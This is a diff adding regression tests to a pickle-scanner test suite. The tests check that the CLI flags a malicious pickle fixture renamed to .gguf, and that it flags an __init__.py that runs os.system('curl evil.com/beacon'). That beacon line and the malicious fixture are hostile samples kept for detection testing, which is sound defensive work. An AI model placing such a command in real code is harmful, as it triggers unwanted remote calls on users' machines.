@@ -2,6 +2,11 @@
 Tests for the pickle opcode scanner.
 Verifies detection of dangerous callables, bypass techniques, and safe allowlisting.
 """
+import json
+import pickle
+import subprocess
+import sys
+import tempfile
 import os
 import struct
 import unittest
@@ -139,6 +144,36 @@ class TestPickleProtocol2Opcodes(unittest.TestCase):
         scanner.scan()
         self.assertIn("os.system", scanner.globals_found)
 
+
+
+
+class TestCliBypassRegressions(unittest.TestCase):
+    def test_cli_scans_single_renamed_pickle_file(self):
+        with tempfile.TemporaryDirectory() as d:
+            path = os.path.join(d, "malicious.gguf")
+            with open(path, "wb") as f:
+                f.write(_load_fixture("malicious_os_system.pkl"))
+            proc = subprocess.run(
+                [sys.executable, "-m", "scanner.cli", path, "--no-network", "--format", "json"],
+                text=True,
+                capture_output=True,
+            )
+            data = json.loads(proc.stdout)
+            self.assertEqual(data["files_scanned"], 1)
+            self.assertIn("HFS-050", [f["rule_id"] for f in data["findings"]])
+
+    def test_cli_flags_init_python_execution_gadget(self):
+        with tempfile.TemporaryDirectory() as d:
+            init_path = os.path.join(d, "__init__.py")
+            with open(init_path, "w", encoding="utf-8") as f:
+                f.write("import os\nos.system('curl evil.com/beacon')\n")
+            proc = subprocess.run(
+                [sys.executable, "-m", "scanner.cli", d, "--no-network", "--format", "json"],
+                text=True,
+                capture_output=True,
+            )
+            data = json.loads(proc.stdout)
+            self.assertIn("HFS-001", [f["rule_id"] for f in data["findings"]])
 
 if __name__ == "__main__":
     unittest.main()
